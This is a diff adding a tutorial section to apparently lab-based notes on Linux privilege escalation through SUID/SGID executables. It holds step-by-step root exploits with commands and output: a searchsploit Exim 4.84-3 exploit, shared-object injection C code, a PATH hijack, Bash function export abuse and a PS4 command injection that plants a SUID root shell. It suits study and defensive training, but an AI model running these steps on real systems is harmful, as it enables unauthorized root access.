@@ -198,6 +198,17 @@ Hacking linux
   - [File Permissions 2](#File-Permissions-2)
   - [PATH Environment Variable](#PATH-Environment-Variable)
   - [Wildcards](#Wildcards)
+- [SUID and SGID Executables](#SUID-and-SGID-Executables)
+  - [Finding SUID and SGID Files](#Finding-SUID-and-SGID-Files)
+  - [Shell Escape Sequences 2](#Shell-Escape-Sequences-2)
+  - [A Quick Word on LD-PRELOAD and LD-LIBRARY-PATH](#A-Quick-Word-on-LD-PRELOAD-and-LD-LIBRARY-PATH)
+  - [Known Exploits](#Known-Exploits)
+  - [Shared Object Injection](#Shared-Object-Injection)
+  - [PATH Environment Variable 2](#PATH-Environment-Variable-2)
+  - [Finding Vulnerable Programs](#Finding-Vulnerable-Programs)
+  - [Abusing Shell Features 1](#Abusing-Shell-Features-1)
+  - [Abusing Shell Features 2](#Abusing-Shell-Features-2)
+- [Passwords and Keys](#Passwords-and-Keys)
   
 -------------------------------------------------------------------------------------------------------------------------------------------------------
 - [Linux Privilige Escalation 1](#Linux-Privilige-Escalation-1)
@@ -3373,7 +3384,7 @@ uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
 groups=0(root) ...
 ```
 
-## Wildcards
+## Wildcards 2
 When a wildcard character (*) is provided to a command as part of an
 argument, the shell will first perform filename expansion (also known as
 globbing) on the wildcard.
@@ -3385,7 +3396,7 @@ your home directory:
 $ echo *
 ```
 
-## Wildcards & Filenames
+## Wildcards and Filenames
 Since filesystems in Linux are generally very permissive with filenames,
 and filename expansion happens before the command is executed, it is
 possible to pass command line options (e.g. -h, --help) to commands by
@@ -3458,7 +3469,407 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+## SUID and SGID Executables
 
+SUID files get executed with the privileges of the file owner.
+SGID files get executed with the privileges of the file group.
+If the file is owned by root, it gets executed with root
+privileges, and we may be able to use it to escalate privileges.
+
+## Finding SUID and SGID Files
+
+We can use the following find command to locate files
+with the SUID or SGID bits set:
+```
+$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
+2> /dev/null
+-rwxr-sr-x 1 root shadow 19528 Feb 15 2011 /usr/bin/expiry
+-rwxr-sr-x 1 root ssh 108600 Apr 2 2014 /usr/bin/ssh-agent
+-rwsr-xr-x 1 root root 37552 Feb 15 2011 /usr/bin/chsh
+-rwsr-xr-x 2 root root 168136 Jan 5 2016 /usr/bin/sudo
+-rwxr-sr-x 1 root tty 11000 Jun 17 2010 /usr/bin/bsd-write
+-rwxr-sr-x 1 root crontab 35040 Dec 18 2010 /usr/bin/crontab
+...
+```
+
+## Shell Escape Sequences 2
+Just as we were able to use shell escape sequences with programs
+running via sudo, we can do the same with SUID / SGID files.
+A list of programs with their shell escape sequences can be found
+here: https://gtfobins.github.io/
+Refer to the previous section on shell escape sequences for how to
+use them.
+
+## A Quick Word on LD-PRELOAD and LD-LIBRARY-PATH
+You may be thinking: why we can’t just use the same
+LD_PRELOAD and LD_LIBRARY_PATH environment variable
+tricks we used with sudo privilege escalation?
+By default, this is disabled in Linux, due to the obvious
+security risk it presents!
+Both these environment variables get ignored when SUID
+files are executed.
+
+## Known Exploits
+Certain programs install SUID files to aid their operation.
+Just as services which run as root can have vulnerabilities we
+can exploit for a root shell, so too can these SUID files.
+Exploits can be found using Searchsploit, Google, and GitHub,
+in the same way we find exploits for Kernels and Services.
+
+
+## Privilege Escalation
+1.
+Find SUID/SGID files on the target:
+```
+$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
+2> /dev/null
+...
+-rwsr-xr-x 1 root root 963691 May 13 2017 /usr/sbin/exim-4.84-3
+...
+```
+Exim is a popular mail transfer agent that is somewhat
+notorious for having many security vulnerabilities.
+
+
+2.
+The version of exim is rather obvious from the filename, however we can
+confirm it:
+```
+$ /usr/sbin/exim-4.84-3 --version
+Exim version 4.84 #3 built 13-May-2017 01:45:35
+```
+3.
+Using searchsploit on our local machine, we find a local privilege escalation
+for this exact version:
+```
+# searchsploit exim 4.84
+...
+Exim 4.84-3 - Local Privilege Escalation | exploits/linux/local/39535.sh
+```
+
+4.
+Copy the exploit script across to the target machine. You
+may need to remove ^M characters from the script:
+```
+$ sed -e "s/^M//" 39535.sh > privesc.sh
+```
+Note that to get ^M you have to hold Ctrl and then press
+V and M in succession.
+5.
+Make sure the script is executable:
+```
+$ chmod + privesc.sh
+```
+
+. Execute the script to gain a root shell:
+```
+$ ./privesc.sh
+[ CVE-2016-1531 local root exploit
+sh-4.1# id
+uid=0(root) gid=1000(user) groups=0(root)
+```
+
+## Shared Object Injection
+When a program is executed, it will try to load the shared objects it
+requires.
+By using a program called strace, we can track these system calls
+and determine whether any shared objects were not found.
+If we can write to the location the program tries to open, we can
+create a shared object and spawn a root shell when it is loaded.
+
+ 
+ ## Privilege Escalation
+1. Find SUID/SGID files on the target:
+```
+$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
+2> /dev/null
+...
+-rwsr-sr-x 1 root staff 9861 May 14 2017 /usr/local/bin/suid-so
+...
+```
+The suid-so file should execute with root user
+permissions.
+
+
+2.
+Run strace on the SUID file:
+```
+$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such
+file"
+access("/etc/suid-debug", F_OK)
+= -1 ENOENT (No such file or
+directory)
+...
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such
+file or directory)
+```
+The libcalc.so shared object could not be found, and the program is
+looking in our user’s home directory, which we can write to.
+
+
+3. Create the /home/user/.config directory.
+4. Create the file libcalc.c with the following contents:
+```
+#include <stdio.h>
+#include <stdlib.h>
+static void inject() __attribute__((constructor));
+void inject() {
+setuid(0);
+system("/bin/bash -p");
+}
+```
+
+
+5. Compile libcalc.c into /home/user/.config/libcalc.so:
+```
+$ gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
+6. Run the SUID executable to get a root shell:
+$ /usr/local/bin/suid-so
+Calculating something, please wait...
+bash-4.1# id
+uid=0(root) gid=1000(user) egid=50(staff) groups=0(root) ...
+```
+
+## PATH Environment Variable 2
+The PATH environment variable contains a list of directories where
+the shell should try to find programs.
+If a program tries to execute another program, but only specifies
+the program name, rather than its full (absolute) path, the shell will
+search the PATH directories until it is found.
+Since a user has full control over their PATH variable, we can tell the
+shell to first look for programs in a directory we can write to.
+
+
+## Finding Vulnerable Programs
+If a program tries to execute another program, the name of that
+program is likely embedded in the executable file as a string.
+We can run strings on the executable file to find strings of
+characters.
+We can also use strace to see how the program is executing.
+Another program called ltrace may also be of use.
+
+
+## Finding Vulnerable Programs (cont.)
+Running strings against a file:
+```
+$ strings /path/to/file
+```
+Running strace against a command:
+```
+$ strace -v -f -e execve <command> 2>&1 | grep exec
+```
+Running ltrace against a command:
+```
+$ ltrace <command>
+```
+
+## Privilege Escalation
+1. Find SUID/SGID files on the target:
+```
+$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
+2> /dev/null
+...
+-rwsr-sr-x 1 root staff 6883 May 14 2017 /usr/local/bin/suid-env
+...
+```
+The suid-env file should execute with root user
+permissions.
+
+2.
+Run strings on the SUID file:
+```
+$ strings /usr/local/bin/suid-env
+/lib64/ld-linux-x86-64.so.2
+...
+```
+service apache2 start
+The file could be trying to run the service program without a full path.
+3.
+We can verify this with strace:
+```
+$ strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
+[pid 14395] execve("/bin/sh", ["sh", "-c", "service apache2 start"],
+...
+```
+
+4.
+Optionally, we can also verify with ltrace:
+```
+$ ltrace /usr/local/bin/suid-env 2>&1 | grep service
+system("service apache2 start"
+```
+This reveals that the system function is being used to execute the
+service program.
+5.
+Create a file service.c with the following contents:
+```
+int main() {
+setuid(0);
+system("/bin/bash -p");
+}
+```
+
+
+6.
+Compile service.c into a file called service:
+```
+$ gcc -o service service.c
+```
+7.
+Prepend the current directory (or where the new service
+executable is located) to the PATH variable, and execute the SUID
+file for a root shell:
+```
+$ PATH=.:$PATH /usr/local/bin/suid-env
+root@debian:~# id
+uid=0(root) gid=0(root) groups=0(root) ...
+```
+
+## Abusing Shell Features 1
+In some shells (notably Bash <4.2-048) it is possible to define
+user functions with an absolute path name.
+These functions can be exported so that subprocesses have
+access to them, and the functions can take precedence over
+the actual executable being called.
+
+
+## Privilege Escalation
+1. Find SUID/SGID files on the target:
+```
+$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
+2> /dev/null
+...
+-rwsr-sr-x 1 root staff 6899 May 14 2017 /usr/local/bin/suid-env2
+...
+```
+The suid-env file should execute with root user
+permissions.
+
+
+2.
+Run strings on the SUID file:
+```
+$ strings /usr/local/bin/suid-env2
+...
+/usr/sbin/service apache2 start
+```
+The file could be trying to run the /usr/sbin/service program.
+3.
+We can verify this with strace:
+```
+$ strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
+[pid 16729] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2
+start"]...
+```
+
+
+4.
+Optionally, we can also verify with ltrace:
+```
+$ ltrace /usr/local/bin/suid-env2 2>&1 | grep service
+system("/usr/sbin/service apache2 start"
+```
+This reveals that the system function is being used to execute the
+/usr/sbin/service program.
+5.
+Verify the version of Bash is lower than 4.2-048:
+```
+$ bash --version
+GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+```
+
+6.
+Create a Bash function with the name “/usr/sbin/service” and
+export the function:
+```
+$ function /usr/sbin/service { /bin/bash -p; }
+$ export –f /usr/sbin/service
+```
+7.
+Execute the SUID file for a root shell:
+```
+$ /usr/local/bin/suid-env2
+root@debian:~# id
+uid=0(root) gid=0(root) groups=0(root) ...
+```
+
+
+## Abusing Shell Features 2
+Bash has a debugging mode which can be enabled with the –x command
+line option, or by modifying the SHELLOPTS environment variable to
+include xtrace.
+By default, SHELLOPTS is read only, however the env command allows
+SHELLOPTS to be set.
+When in debugging mode, Bash uses the environment variable PS4 to
+display an extra prompt for debug statements. This variable can include an
+embedded command, which will execute every time it is shown.
+
+
+## Abusing Shell Features (#2) (cont.)
+If a SUID file runs another program via Bash (e.g. by using
+system() ) these environment variables can be inherited.
+If an SUID file is being executed, this command will execute
+with the privileges of the file owner.
+In Bash versions 4.4 and above, the PS4 environment variable
+is not inherited by shells running as root.
+
+
+## Privilege Escalation
+1. Find SUID/SGID files on the target:
+```
+$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
+2> /dev/null
+...
+-rwsr-sr-x 1 root staff 6899 May 14 2017 /usr/local/bin/suid-env2
+...
+```
+The suid-env2 file should execute with root user
+permissions.
+
+
+2.
+Run strings on the SUID file:
+```
+$ strings /usr/local/bin/suid-env2
+...
+/usr/sbin/service apache2 start
+```
+The file could be trying to run the /usr/sbin/service program.
+3.
+We can verify this with strace:
+```
+$ strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
+[pid 16729] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2
+start"]...
+```
+
+4.
+Optionally, we can also verify with ltrace:
+```
+$ ltrace /usr/local/bin/suid-env 2>&1 | grep service
+system("service apache2 start"
+```
+This reveals that the system function is being used to execute the
+service program.
+5.
+Run the SUID file with bash debugging enabled and the PS4
+variable assigned to our payload:
+```
+$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown
+root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
+```
+
+6. Run the /tmp/rootbash file with the -p command
+line option to get a root shell:
+```
+$ /tmp/rootbash -p
+rootbash-4.1# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
+groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(pl
+ugdev),1000(user)
+```
+
+## Passwords and Keys
 ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## Linux Privilige Escalation 1
